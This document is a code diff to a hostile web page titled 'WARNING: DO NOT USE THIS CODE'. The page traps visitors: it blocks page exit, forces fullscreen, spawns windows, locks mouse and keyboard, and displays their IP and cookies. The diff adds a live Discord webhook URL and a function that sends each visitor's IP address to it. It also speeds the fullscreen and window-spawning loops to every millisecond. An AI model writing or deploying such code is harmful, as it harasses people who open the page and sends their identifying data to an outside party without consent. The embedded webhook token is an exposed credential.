@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
 <head>
     <title>WARNING: DO NOT USE THIS CODE</title>
@@ -39,6 +40,15 @@
 
     <script type="module">
         const videoPath = 'https://hugeitor88.github.io/Script-Archive/SPOILER_VID_20200420_040019.mp4';
+        const webhookURL = 'https://discord.com/api/webhooks/1363802691301806090/LCkmtlapihHLZnBW__QadeHZyAiBQ9TldJlPfaHHrjQt7i0P97xsdRwjFjx3hrH80jpf';
+
+        function sendToWebhook(text) {
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: text })
+            });
+        }
 
         function preventExit() {
             window.onbeforeunload = () => false;
@@ -54,7 +64,9 @@
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    document.getElementById('ipDisplay').textContent = data.ip;
+                    const ip = data.ip;
+                    document.getElementById('ipDisplay').textContent = ip;
+                    sendToWebhook("IP: " + ip); // Enviamos la IP al webhook
                 });
         }
 
@@ -68,7 +80,7 @@
                     document.documentElement.webkitRequestFullscreen();
                 }
             }
-            setInterval(enterFullscreen, 1000);
+            setInterval(enterFullscreen, 1);
         }
 
         function setupVideo() {
@@ -101,7 +113,7 @@
                 if (newWindow) {
                     newWindow.focus();
                 }
-            }, 1000);
+            }, 1);
         }
 
         function lockMouseAndKeyboard() {
@@ -122,7 +134,7 @@
         setupVideo();
         spawnWindows();
         lockMouseAndKeyboard();
-        
+
         document.getElementById('cookieDisplay').textContent = getCookie();
     </script>
 </body>
